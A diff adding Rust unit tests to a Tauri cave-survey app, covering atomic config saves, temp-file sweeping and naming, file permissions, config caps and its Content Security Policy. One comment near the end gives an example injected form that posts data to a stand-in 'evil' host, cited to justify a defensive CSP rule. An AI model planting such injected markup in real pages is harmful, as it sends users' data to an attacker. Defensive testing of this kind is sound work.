@@ -2994,3 +2994,587 @@ fn speleodb_poll_interval_defaults_to_60_and_clamps_up_to_floor() {
     let deserialized: SpeleoDbConfig = toml::from_str("").expect("empty speleodb parses");
     assert_eq!(deserialized.poll_interval_seconds, 60);
 }
+
+// ========================================================================
+// Atomic save tests (#357 item 3: `write_atomically` = sibling temp file +
+// `sync_all` + rename, replacing a bare `fs::write` that truncated the
+// destination before writing a byte).
+// ========================================================================
+
+#[test]
+fn test_save_to_path_round_trips_settings_across_sections() {
+    // A SERIALIZATION guard, not an atomicity one - restoring a plain
+    // `fs::write` leaves this green, because all it asks is that a normal save
+    // survives a reload across several sections of the config. That is worth
+    // pinning on its own (the temp-file+rename rewrite had to not disturb it),
+    // but the atomicity claim is carried by
+    // `test_save_to_path_leaves_destination_untouched_when_write_cannot_complete`,
+    // which is the test that goes red if the destination is written in place.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+
+    let mut config = Config::default();
+    config.general.locale = "en-US".to_string();
+    config.general.undo_history_limit = 77;
+    config.panels.sections_panel_width = 300;
+    config.placement_suggestion.azimuth_sigma = 2.5;
+    config.display.grid_spacing = 3.25;
+
+    config.save_to_path(&path).unwrap();
+    let loaded = Config::load_from_path(&path).unwrap();
+
+    assert_eq!(loaded.general.locale, "en-US");
+    assert_eq!(loaded.general.undo_history_limit, 77);
+    assert_eq!(loaded.panels.sections_panel_width, 300);
+    assert_eq!(loaded.placement_suggestion.azimuth_sigma, 2.5);
+    assert_eq!(loaded.display.grid_spacing, 3.25);
+}
+
+/// Backdate a file's mtime so the staleness margin in `sweep_stale_temp_files`
+/// treats it as abandoned. `std::fs::FileTimes` keeps this dependency-free.
+fn backdate(path: &std::path::Path, age: std::time::Duration) {
+    let file = std::fs::File::options().write(true).open(path).unwrap();
+    let when = std::time::SystemTime::now() - age;
+    file.set_times(std::fs::FileTimes::new().set_modified(when))
+        .unwrap();
+}
+
+/// Comfortably past `atomic_write::STALE_TEMP_AGE` (one hour).
+const ABANDONED: std::time::Duration = std::time::Duration::from_secs(2 * 60 * 60);
+
+/// Every entry in `dir` whose name marks it as a `write_atomically` temp file.
+///
+/// The assertion has to be made against the DIRECTORY, not against a computed
+/// path: `write_atomically` names its temp file `config.toml.<pid>.<n>.tmp`, so
+/// a test that recomputes one specific name (the old `path.with_extension(
+/// "toml.tmp")`) asserts the absence of a path no implementation can ever
+/// create, and passes even against one that leaks every temp file it opens.
+fn temp_file_siblings(dir: &std::path::Path) -> Vec<String> {
+    std::fs::read_dir(dir)
+        .unwrap()
+        .flatten()
+        .filter_map(|entry| entry.file_name().to_str().map(str::to_owned))
+        .filter(|name| name.ends_with(".tmp"))
+        .collect()
+}
+
+#[test]
+fn test_save_to_path_leaves_no_temp_file_sibling() {
+    // Guard D: `write_atomically`'s sibling temp file must not survive a
+    // successful save.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+
+    let mut config = Config::default();
+    config.general.undo_history_limit = 55;
+    config.save_to_path(&path).unwrap();
+
+    let leaked = temp_file_siblings(dir.path());
+    assert!(
+        leaked.is_empty(),
+        "a successful save must not leave a temp file behind, found: {leaked:?}"
+    );
+    // Pin the other half: the save did land, so the emptiness above is not
+    // "nothing was written at all".
+    assert!(path.exists(), "the config itself must exist after a save");
+}
+
+#[test]
+fn test_repeated_saves_do_not_accumulate_temp_files() {
+    // The temp name is unique per write, so a leak does not overwrite the
+    // previous leak - it piles up. One save cannot tell those apart; several can.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+
+    let mut config = Config::default();
+    for limit in 1..=5 {
+        config.general.undo_history_limit = limit;
+        config.save_to_path(&path).unwrap();
+    }
+
+    let leaked = temp_file_siblings(dir.path());
+    assert!(
+        leaked.is_empty(),
+        "5 saves must leave no temp files, found: {leaked:?}"
+    );
+}
+
+#[test]
+fn test_load_sweeps_an_abandoned_temp_file() {
+    // A crash between `File::create` and the rename leaves a temp file nothing
+    // else collects. Load is the sweeper.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+    Config::default().save_to_path(&path).unwrap();
+
+    // Stand in for the crashed writer, and backdate it past the staleness
+    // margin - a file younger than that belongs to a possibly-live writer.
+    let abandoned = dir.path().join("config.toml.99999.0.tmp");
+    std::fs::write(&abandoned, "partial").unwrap();
+    backdate(&abandoned, ABANDONED);
+
+    Config::load_from_path(&path).unwrap();
+
+    assert!(
+        !abandoned.exists(),
+        "load must sweep an abandoned config temp file"
+    );
+    assert!(path.exists(), "the sweep must not touch the config itself");
+}
+
+#[test]
+fn test_load_leaves_a_fresh_temp_file_alone() {
+    // The inverse, and the one that matters for correctness: a temp file young
+    // enough to belong to a writer that is still between `File::create` and its
+    // rename must survive. Deleting it reintroduces the ENOENT-on-rename failure
+    // the unique naming exists to prevent.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+    Config::default().save_to_path(&path).unwrap();
+
+    let in_flight = dir.path().join("config.toml.12345.0.tmp");
+    std::fs::write(&in_flight, "a live writer owns this").unwrap();
+
+    Config::load_from_path(&path).unwrap();
+
+    assert!(
+        in_flight.exists(),
+        "load must not delete a temp file a live writer may still rename"
+    );
+}
+
+#[test]
+fn test_load_sweep_spares_unrelated_files() {
+    // The sweep is name-scoped. A project's own `.stalx.tmp` and any other
+    // sibling must be untouched even when they are ancient.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+    Config::default().save_to_path(&path).unwrap();
+
+    let spared = ["cave.stalx.tmp", "notes.txt", "config.toml.backup"];
+    for name in spared {
+        let file = dir.path().join(name);
+        std::fs::write(&file, "keep me").unwrap();
+        backdate(&file, ABANDONED);
+    }
+
+    Config::load_from_path(&path).unwrap();
+
+    for name in spared {
+        assert!(
+            dir.path().join(name).exists(),
+            "the sweep must not delete {name}"
+        );
+    }
+}
+
+#[test]
+fn test_save_to_path_leaves_destination_untouched_when_write_cannot_complete() {
+    // Guard E: simulate a write that cannot complete, and assert the destination
+    // is left exactly as the previous successful save left it - the whole point
+    // of writing to a sibling and renaming rather than truncating `config.toml`.
+    //
+    // The failure is forced by making the config DIRECTORY unwritable, so
+    // `File::create` fails with EACCES before a byte of the destination is
+    // touched. An earlier version pre-occupied `config.toml.tmp` with a directory
+    // to get EISDIR, which was simpler but depended on the temp name being
+    // predictable - and it is deliberately NOT: `write_atomically` makes it unique
+    // per write (pid plus a counter) so two writers on one config directory cannot
+    // clobber each other's temp file. Pinning the old fixed name here would have
+    // quietly re-asserted the shared-resource bug as the spec.
+    //
+    // Unix-only: it turns on POSIX permission bits, and the Windows ACL equivalent
+    // is not the same test. The behaviour under guard is platform-independent, so
+    // covering it on one family is enough.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        use tempfile::tempdir;
+        let dir = tempdir().unwrap();
+        let path = dir.path().join("config.toml");
+
+        let mut old = Config::default();
+        old.general.undo_history_limit = 11;
+        old.save_to_path(&path).unwrap();
+
+        // r-xr-xr-x: readable, so the survivor can still be loaded below, but no
+        // new file may be created in it. Not effective as root, which is why this
+        // is not run in a container as root.
+        let original = std::fs::metadata(dir.path()).unwrap().permissions();
+        std::fs::set_permissions(dir.path(), std::fs::Permissions::from_mode(0o555)).unwrap();
+
+        let mut new = Config::default();
+        new.general.undo_history_limit = 99;
+        let result = new.save_to_path(&path);
+
+        // Restore BEFORE asserting, so a failed assertion cannot leave the
+        // TempDir undeletable and take unrelated tests down with it.
+        std::fs::set_permissions(dir.path(), original).unwrap();
+
+        assert!(
+            result.is_err(),
+            "a temp file that cannot be created must fail the save"
+        );
+        let survivor = Config::load_from_path(&path).unwrap();
+        assert_eq!(
+            survivor.general.undo_history_limit, 11,
+            "the destination must be untouched by a save that could not complete"
+        );
+    }
+}
+
+// ========================================================================
+// Temp-name unpredictability + collision recovery (#357 residue: `create_new`
+// is fail-CLOSED on an existing name, and the old pid+counter name was fully
+// predictable, so one occupied name - planted or leaked by a crash whose pid got
+// reused inside the sweep's one-hour margin - failed every save of the session).
+// ========================================================================
+
+/// Split a temp-file name into the fields between the fixed `config.toml.`
+/// prefix and the fixed `.tmp` suffix.
+/// A name the sweep would not match yields no fields at all, so the caller's
+/// assertion reports that rather than this helper failing on its own.
+fn temp_name_fields(path: &std::path::Path) -> Vec<String> {
+    let name = path.file_name().unwrap().to_str().unwrap();
+    let Some(middle) = name
+        .strip_prefix("config.toml.")
+        .and_then(|rest| rest.strip_suffix(".tmp"))
+    else {
+        return Vec::new();
+    };
+    middle.split('.').map(str::to_owned).collect()
+}
+
+#[test]
+fn test_temp_name_is_not_a_pure_function_of_pid_and_counter() {
+    // The predictability half of the fix. The old name was
+    // `config.toml.<pid>.<n>.tmp` with `n` starting at 0, so anything able to
+    // write to the config directory could enumerate the names a given process
+    // would use and pre-create them; against O_EXCL that is a denial of
+    // persistence, and the sweep spares a file younger than an hour, so it does
+    // not self-heal within a session.
+    let path = std::path::Path::new("/nonexistent/config.toml");
+    let first = atomic_write::temp_candidate(path);
+    let second = atomic_write::temp_candidate(path);
+    assert_ne!(first, second, "candidates must never repeat");
+
+    let fields = temp_name_fields(&first);
+    assert_eq!(
+        fields.len(),
+        3,
+        "expected <pid>.<seq>.<nonce>, got {fields:?} - a two-field name is the \
+         predictable pid+counter shape this test exists to rule out"
+    );
+    let other = temp_name_fields(&second);
+    assert_eq!(other.len(), 3, "second candidate: got {other:?}");
+
+    // The pid is the same process; the counter is guessable by construction. The
+    // nonce is the part an outsider cannot compute, so it is the part that has to
+    // be fresh on every candidate.
+    assert_eq!(fields[0], other[0], "same process, so same pid field");
+    assert_ne!(
+        fields[2], other[2],
+        "the unpredictable field must be redrawn per candidate"
+    );
+    assert!(
+        fields[2].len() >= 32 && fields[2].chars().all(|c| c.is_ascii_hexdigit()),
+        "expected a v4 UUID in simple form (32 hex chars), got {:?}",
+        fields[2]
+    );
+}
+
+#[test]
+fn test_load_sweeps_a_temp_file_named_the_way_writes_name_them() {
+    // Ties the sweep's `starts_with("config.toml.") && ends_with(".tmp")`
+    // predicate to the name the writer actually produces, using the writer's own
+    // generator rather than a hand-written copy. Without this, a change to the
+    // name shape (this one added a nonce field) could silently stop being swept -
+    // and the sweep is the only thing that collects these.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+    Config::default().save_to_path(&path).unwrap();
+
+    let abandoned = atomic_write::temp_candidate(&path);
+    std::fs::write(&abandoned, "partial").unwrap();
+    backdate(&abandoned, ABANDONED);
+
+    Config::load_from_path(&path).unwrap();
+
+    assert!(
+        !abandoned.exists(),
+        "the sweep must still match the writer's temp-file names, missed {abandoned:?}"
+    );
+}
+
+#[test]
+fn test_write_retries_past_an_occupied_temp_name() {
+    // The recoverability half. Forcing the collision needs the name source
+    // injected, because the nonce is exactly what makes it unreachable from
+    // outside - so this drives `write_atomically_with`, which is the same
+    // function `write_atomically` is a one-line wrapper around.
+    use tempfile::tempdir;
+    let dir = tempdir().unwrap();
+    let path = dir.path().join("config.toml");
+    Config::default().save_to_path(&path).unwrap();
+
+    // Stands in for a leaked temp file from a crashed writer whose pid was
+    // reused, or for a plant. Either way it is not ours to delete.
+    let occupied = dir.path().join("config.toml.4242.0.abcdef.tmp");
+    std::fs::write(&occupied, "not mine").unwrap();
+
+    let mut handed_out = 0;
+    let mut candidates = || {
+        handed_out += 1;
+        if handed_out == 1 {
+            occupied.clone()
+        } else {
+            atomic_write::temp_candidate(&path)
+        }
+    };
+    // Asserted as bytes rather than through `Config::load_from_path`: the
+    // question here is whether the retried write reached the destination at all,
+    // and a round-trip through the parser would answer a different one.
+    let contents = "written by the retry\n";
+    atomic_write::write_atomically_with(&path, contents, &mut candidates)
+        .expect("an occupied temp name must cost a retry, not the save");
+
+    assert_eq!(
+        std::fs::read_to_string(&path).unwrap(),
+        contents,
+        "the retried write must land on the destination"
+    );
+    assert_eq!(
+        std::fs::read_to_string(&occupied).unwrap(),
+        "not mine",
+        "a temp file we did not create must be left alone - deleting a live \
+         writer's temp file reintroduces the ENOENT-on-rename it exists to prevent"
+    );
+    // Everything except the pre-planted squatter must be gone.
+    let leaked: Vec<String> = temp_file_siblings(dir.path())
+        .into_iter()
+        .filter(|name| !occupied.ends_with(name))
+        .collect();
+    assert!(
+        leaked.is_empty(),
+        "the retry must not leak its own temp files, found: {leaked:?}"
+    );
+}
+
+// ========================================================================
+// Config-file permissions (#357 residue: `fs::write` opened the EXISTING file
+// and kept its mode; a freshly created temp file is `0o666 & ~umask`, and the
+// rename carries that onto `config.toml`).
+// ========================================================================
+
+#[test]
+fn test_save_preserves_the_config_files_own_mode() {
+    // A user who tightened their config must keep it. Saves fire on every
+    // project open, create and save, so the regression republished the file -
+    // which names the keychain account and every recent project's absolute path
+    // - at the process umask within seconds of a `chmod`.
+    //
+    // The modes under test are deliberately NOT 0600. The temp file is created
+    // 0600, so a 0600 destination cannot distinguish inheritance from that
+    // default: the test would pass with the inheritance deleted outright. Each
+    // mode here differs from both 0600 and the umask default, so only carrying
+    // the destination's own mode across produces it - and both directions are
+    // covered, since a save that clamped every config to 0600 would be a
+    // different bug wearing this one's fix.
+    //
+    // Unix-only: Windows has no mode bits to carry, and its ACLs are inherited
+    // from the directory by old and new file alike.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        use tempfile::tempdir;
+        for (limit, expected) in [(42usize, 0o640u32), (43, 0o664), (44, 0o600)] {
+            let dir = tempdir().unwrap();
+            let path = dir.path().join("config.toml");
+            Config::default().save_to_path(&path).unwrap();
+            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(expected)).unwrap();
+
+            let mut config = Config::default();
+            config.general.undo_history_limit = limit;
+            config.save_to_path(&path).unwrap();
+
+            let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+            assert_eq!(
+                mode, expected,
+                "a save must replace the config without changing its mode \
+                 (expected {expected:o}, got {mode:o})"
+            );
+            // The other half: the mode survived because the file was replaced
+            // with its mode carried over, not because the save never happened.
+            assert_eq!(
+                Config::load_from_path(&path)
+                    .unwrap()
+                    .general
+                    .undo_history_limit,
+                limit,
+                "the save itself must still land"
+            );
+        }
+    }
+}
+
+#[test]
+fn test_first_save_creates_a_private_config_file() {
+    // With no destination to inherit from there is no user intent to preserve,
+    // so the default is the private one rather than the umask's. Same file,
+    // same sensitive contents - the only difference is that the user has not
+    // had the chance to tighten it yet.
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        use tempfile::tempdir;
+        let dir = tempdir().unwrap();
+        let path = dir.path().join("config.toml");
+
+        Config::default().save_to_path(&path).unwrap();
+
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(
+            mode, 0o600,
+            "a config created from scratch must not be group/world readable (got {mode:o})"
+        );
+    }
+}
+
+// ========================================================================
+// `[general]` collection bounds (#357 residue: the same unbounded-growth shape
+// `normalize_column_names` closed, still open on three more fields).
+// ========================================================================
+
+#[test]
+fn test_normalize_caps_general_collections() {
+    // The load-path half - `Config::load` re-parses whatever is on disk, so the
+    // caps have to hold for a hand-edited file as well as for an IPC payload.
+    let mut config = Config::default();
+    config.general.onboarding_completed_flows = (0..100_000).map(|i| format!("flow-{i}")).collect();
+    config
+        .general
+        .onboarding_completed_flows
+        .push("x".repeat(5000));
+    config.general.locale = "e".repeat(10_000);
+    config.general.number_format = "n".repeat(10_000);
+    config.general.date_format = "d".repeat(10_000);
+    config.general.recent_projects_max = usize::MAX;
+    config.general.recent_projects = (0..100_000)
+        .map(|i| std::path::PathBuf::from(format!("/caves/{i}.stalx")))
+        .collect();
+
+    config.normalize();
+
+    let general = &config.general;
+    assert!(
+        general.onboarding_completed_flows.len() <= 256,
+        "flow ids uncapped: {}",
+        general.onboarding_completed_flows.len()
+    );
+    assert!(
+        general
+            .onboarding_completed_flows
+            .iter()
+            .all(|flow| flow.len() <= 128),
+        "an oversized flow id survived"
+    );
+    assert_eq!(
+        general.locale, "system",
+        "an unusable locale tag must fall back to its default"
+    );
+    assert_eq!(general.number_format, "locale");
+    assert_eq!(general.date_format, "locale");
+    assert!(
+        general.recent_projects_max <= 256,
+        "recent_projects_max uncapped: {}",
+        general.recent_projects_max
+    );
+    assert_eq!(
+        general.recent_projects.len(),
+        general.recent_projects_max,
+        "the recents list must obey its own cap"
+    );
+
+    // Repair, not reset: ordinary values go through untouched.
+    let mut ok = Config::default();
+    ok.general.locale = "en-US".to_string();
+    ok.general.number_format = "de-DE".to_string();
+    ok.general.onboarding_completed_flows = vec!["workspace-basics".to_string()];
+    ok.general.recent_projects = vec![std::path::PathBuf::from("/caves/cenote.stalx")];
+    ok.normalize();
+    assert_eq!(ok.general.locale, "en-US");
+    assert_eq!(ok.general.number_format, "de-DE");
+    assert_eq!(
+        ok.general.onboarding_completed_flows,
+        vec!["workspace-basics".to_string()]
+    );
+    assert_eq!(ok.general.recent_projects.len(), 1);
+}
+
+/// `connect-src` in BOTH policies must admit Tauri's own IPC origin.
+///
+/// Every `invoke` is a `fetch` to `ipc://localhost/<cmd>` (macOS/Linux) or
+/// `http://ipc.localhost/<cmd>` (Windows) - see `ipc-protocol.js` in the `tauri`
+/// crate - so `connect-src` governs it, and Tauri does NOT add the origin back:
+/// `set_csp` merges only script/style hashes, and its one automatic `default-src`
+/// addition is gated on the isolation pattern, which this app does not use.
+///
+/// Omitting it does not brick the app, which is exactly why this needs a test:
+/// the failure is silent. Tauri catches the CSP rejection, warns once to a
+/// console nobody reads in a packaged build, latches `customProtocolIpcFailed`
+/// and falls back to `postMessage` for the rest of the session - losing the
+/// binary response path for every IPC reply. Nothing else in this repo can catch
+/// it: `tauri.conf.json` has no linter, and the production `csp` (as opposed to
+/// `devCsp`) is not exercised by the dev server, Playwright, or vitest - only by
+/// a real `tauri build`.
+#[test]
+fn test_csp_allows_the_tauri_ipc_origin() {
+    let conf_path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json");
+    let conf: serde_json::Value =
+        serde_json::from_str(&std::fs::read_to_string(&conf_path).unwrap()).unwrap();
+
+    let security = &conf["app"]["security"];
+    for key in ["csp", "devCsp"] {
+        // `assert!` rather than `unwrap_or_else(|| panic!(..))`: `clippy::panic`
+        // is deny-level here, and this module's `#[expect]` (config/mod.rs)
+        // covers `unwrap`/`expect` but deliberately not `panic!`.
+        let policy = security[key].as_str();
+        assert!(policy.is_some(), "app.security.{key} must be a string");
+        let policy = policy.unwrap();
+
+        let connect_src = policy
+            .split(';')
+            .map(str::trim)
+            .find(|directive| directive.starts_with("connect-src"));
+        assert!(connect_src.is_some(), "{key} must declare connect-src");
+        let connect_src = connect_src.unwrap();
+
+        for origin in ["ipc:", "http://ipc.localhost"] {
+            assert!(
+                connect_src.split_whitespace().any(|src| src == origin),
+                "{key}'s connect-src must list `{origin}` or every invoke falls \
+                 back to the slower postMessage transport; got: {connect_src}"
+            );
+        }
+
+        // `form-action` and `frame-ancestors` have NO `default-src` fallback in
+        // CSP3, so a tight `connect-src` is not the exfil control it looks like:
+        // an injected `<form method=POST action=https://evil/>` posts survey data
+        // straight past it. Neither directive can break a Tauri app, so there is
+        // no reason for either to be absent.
+        for directive in ["form-action 'none'", "frame-ancestors 'none'"] {
+            assert!(
+                policy.split(';').map(str::trim).any(|d| d == directive),
+                "{key} must declare `{directive}` - it does not fall back to \
+                 default-src; got: {policy}"
+            );
+        }
+    }
+}
